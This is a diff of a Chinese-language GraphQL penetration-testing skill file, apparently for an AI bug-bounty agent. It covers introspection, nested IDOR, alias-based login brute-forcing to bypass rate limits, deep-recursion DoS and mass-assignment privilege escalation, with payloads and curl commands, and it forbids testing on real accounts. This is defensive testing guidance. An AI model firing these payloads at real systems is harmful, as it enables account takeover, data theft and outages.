@@ -1,253 +1,58 @@
 # GraphQL
 
-> 视角：黑盒，针对 GraphQL 端点的特有攻击
+> 视角：黑盒。**判断流程优先，payload 靠现场构造，不背。**
 
-## 1. 一句话说清
+## 排他声明
 
-GraphQL = 一个端点（通常 `/graphql`），所有 query / mutation 走它。
-特有风险：Introspection 暴露 schema、字段级授权缺失、嵌套查询绕过权限、深度递归 DoS。
-SRC 价值：嵌套 IDOR + 字段越权 = P1。
+仅当端点确认是 GraphQL 时用本 skill。
 
----
+- 判 GraphQL 只需一个 `{__typename}`，非 GraphQL 立刻离开
+- REST 端点 → api-rest skill
+- query 字段值里的 SQL / NoSQL 注入 → sqli skill
 
-## 2. 高频入口点
+## 一句话说清
 
-```
-/graphql       /api/graphql       /v1/graphql
-/graphiql      /playground         /api-explorer
-/graphql.php   /graphql.json
-```
+GraphQL = 一个端点，所有 query / mutation 走它。特有风险：Introspection、字段级授权缺失、别名限频、深度递归 DoS。
 
-测试方法是否 GraphQL：
+## 判断流程（★ 核心，Step1-5）
 
-```bash
-curl -X POST -H "Content-Type: application/json" \
-  -d '{"query":"query{__typename}"}' https://target/graphql
+### Step 1 — 判是否 GraphQL
+1 个请求：
+`POST /graphql {"query":"query{__typename}"}`
+- 200 + `{"data":{"__typename":"Query"}}` → 是 GraphQL，继续
+- 其他（HTML / 404 / 非 GraphQL 报错）→ NO 停，立刻离开
 
-→ 返回 {"data":{"__typename":"Query"}} = 是 GraphQL
-```
+### Step 2 — Introspection 是否开启
+1 个请求：
+`{"query":"{__schema{types{name}}}"}`
+- 返回完整 types 列表 → 开启，拉 schema 找敏感字段（`password` / `ssn` / `creditCard` / `apiKey` / `balance`）
+- 返回 `"message":"...not allowed"` 等 → 关闭，判断目标是否值得用 clairvoyance 推断（不值 → NO 停）
 
----
+### Step 3 — 字段级越权（需第二账号）
+不能只凭"字段名带 password"就报——需双账号对比同一 query：
+1. 账号 A `query{user(id:A){email phone}}` → 基线
+2. 账号 A 改 `query{user(id:B){email phone}}`（B 是第二测试账号）
+3. 返回 B 的数据 → **嵌套 IDOR / 字段越权确认**；返回错误 → NO 停
 
-## 3. 探测手法
+### Step 4 — 别名爆破（绕限频）
+1 个请求判断：
+`mutation{a:login(user:"admin",pass:"x1"){token} b:login(...x2)... z:login(...x26)}`
+- 返回 26 个不同结果（每个 alias 独立执行）→ **限频绕过确认**
+- 返回 rate-limit 错误 / 只 1 个结果 → 被拦，NO 停
 
-### 3.1 Introspection（最先做）
+### Step 5 — 停损
+- 拿到 schema 但无敏感字段 → 停（不硬造敏感字段）
+- 深度递归 DoS 只证明到"响应变慢/超时"，不真打瘫
+- 别名爆破只在自己账号，禁撞真实账号
 
-```graphql
-query {
-  __schema {
-    types {
-      name
-      fields {
-        name
-        type { name kind ofType { name } }
-        args { name type { name } }
-      }
-    }
-    queryType { name }
-    mutationType { name }
-    subscriptionType { name }
-  }
-}
-```
+## 工具
 
-```bash
-# 一行命令
-curl -X POST -H "Content-Type: application/json" \
-  -d '{"query":"{__schema{types{name fields{name}}}}"}' \
-  https://target/graphql | jq
+clairvoyance（无 introspection 的 schema 推断）、graphql-cop。
 
-# 工具
-graphql-cop https://target/graphql
-graphqlmap
-clairvoyance（无 introspection 的 schema 推断）
-```
+## 证据 / 不要做的事
 
-拿到 schema → 找出所有敏感字段（`password`、`ssn`、`creditCard`、`apiKey`、`balance`）。
-
-### 3.2 字段级越权
-
-```graphql
-# 顶层是公开 query
-query {
-  publicPost(id: 123) {
-    title
-    author {
-      email          # ❌ 可能没权限校验
-      phone
-      orders {       # ❌ 嵌套 IDOR
-        id
-        amount
-        creditCard
-      }
-    }
-  }
-}
-```
-
-**重点**：顶层接口"看起来公开"，但通过嵌套返回敏感字段。
-
-### 3.3 IDOR via id
-
-```graphql
-query {
-  user(id: 100) {  # 改成其他 ID
-    email
-    privateMessages { content }
-  }
-}
-```
-
-### 3.4 批量查询 / 别名滥用（绕过限频）
-
-```graphql
-query {
-  a: login(user:"admin",pass:"a") { token }
-  b: login(user:"admin",pass:"b") { token }
-  c: login(user:"admin",pass:"c") { token }
-  ...
-  z: login(user:"admin",pass:"z") { token }
-}
-# 一次请求触发 26 次登录
-```
-
-绕过常规 rate-limit（每个 HTTP 请求计 1 次）。
-
-### 3.5 深度递归 DoS
-
-```graphql
-type User {
-  friends: [User!]!
-}
-
-# 攻击查询
-query {
-  user(id:1) {
-    friends {
-      friends {
-        friends {
-          friends { ... 嵌套 100 层 ... }
-        }
-      }
-    }
-  }
-}
-```
-
-观察响应时间 / 超时。
-
-### 3.6 Mutation Mass Assignment
-
-```graphql
-mutation {
-  updateUser(input: {
-    id: 1,
-    name: "x",
-    isAdmin: true,         # 试这个
-    role: ADMIN
-  }) { id name }
-}
-```
-
-### 3.7 CSRF on GraphQL
-
-```
-1. GraphQL 多数支持 GET（query 在 query string）
-2. 查 Content-Type: application/x-www-form-urlencoded 是否被接受
-3. 接受 → CSRF 可行（普通 form 即可触发）
-```
-
----
-
-## 4. Bypass 矩阵
-
-| 拦 | 绕 |
-|---|---|
-| Introspection 关闭 | clairvoyance 字段推断 / 抓客户端代码（mobile / web）找 query |
-| 顶层鉴权 | 嵌套字段越权 |
-| 批量限频 | 别名 / 多 query |
-| 深度限制 | 折叠：`...frag` 片段循环展开 |
-| ID 类型校验 | 改 GraphQL 类型：`String` 改成 `Int`、`ID` 改成 `null` |
-
----
-
-## 5. 利用提权 / 横向
-
-```
-Introspection → 完整攻击面图
-嵌套 IDOR → 大批 PII
-别名 → 撞库 / 短信轰炸
-mutation Mass Assignment → 提权
-深度 → DoS
-```
-
----
-
-## 6. 真实案例指纹
-
-| 案例 | 一句话 |
-|------|------|
-| GitHub GraphQL | 嵌套字段越权拿 private repo 信息 |
-| Shopify | 别名爆破登录 |
-| HackerOne 自身 | 多次报告 IDOR |
-
-通用：
-- 端点返回 `{"errors":[{"message":"Cannot query field..."}]}` → GraphQL 报错有用
-- Introspection 200 → 立即拉 schema
-- mutation 接受额外字段 → Mass Assignment
-
----
-
-## 7. 复现 / 证据要点
-
-### 7.1 PoC
-
-```http
-POST /graphql HTTP/1.1
-Host: target.com
-Content-Type: application/json
-Authorization: Bearer A_TOKEN
-
-{"query":"query{user(id:200){email phone}}"}
-
-→ 响应：
-{"data":{"user":{"email":"b****@****.com","phone":"138****1234"}}}
-（B 的字段，A 不该能读）
-```
-
-### 7.2 Introspection
-
-```bash
-curl -X POST https://target/graphql \
-  -H 'Content-Type: application/json' \
-  -d '{"query":"{__schema{types{name fields{name}}}}"}' \
-  > schema.json
-
-grep -A 5 -E "(password|ssn|credit|secret|key|token)" schema.json
-```
-
-### 7.3 CVSS
-
-```
-Introspection 暴露                 = 5.3 Medium
-嵌套 IDOR PII                      = 6.5–8.1
-别名爆破                           = 7.5
-mutation Mass Assignment → admin   = 8.8–9.8
-深度递归 DoS                       = 5.3–6.5
-```
-
----
-
-## 8. 不要做的事
-
-- **禁**：用别名爆破真实账号密码。在自己测试账号上演示。
-- **禁**：用深度递归 DoS 实际打瘫服务。10 层、几次请求即可证明。
-- **禁**：嵌套 IDOR 拖出大量数据。3 个不同 ID 的样本足够。
-
-## H1 真实案例
-
-_共 1 份 HackerOne 已披露 High/Critical 报告命中本类，按 (赏金 + 投票×100) 排序取 Top 12_
-
-| Severity | $ | 程序 | 标题（点击看原报告） | 摘要 |
-|---|--:|---|---|---|
-| Critical | 25000 usd | HackerOne | [Disclosing  PolicyPageAssetGroup in Private Programs via /graphql `gid://hackerone/PolicyPageAsse…](https://hackerone.com/reports/1618347) | Summary:** Hi team, I understand what's going on Description:** Just a recent update gives the results of private programs Step… |
+- **证据**：`{__typename}` 确认 + schema 里的敏感字段名 + 双账号响应差异截图。
+- **禁**：用别名爆破真实账号密码（只自己测试号）。
+- **禁**：深度递归 DoS 实际打瘫服务（10 层、几次请求证明即可）。
+- **禁**：嵌套 IDOR 拖大量数据（3 个不同 ID 样本足够）。
+- **禁**：introspection 拿到 schema 后全量 dump。
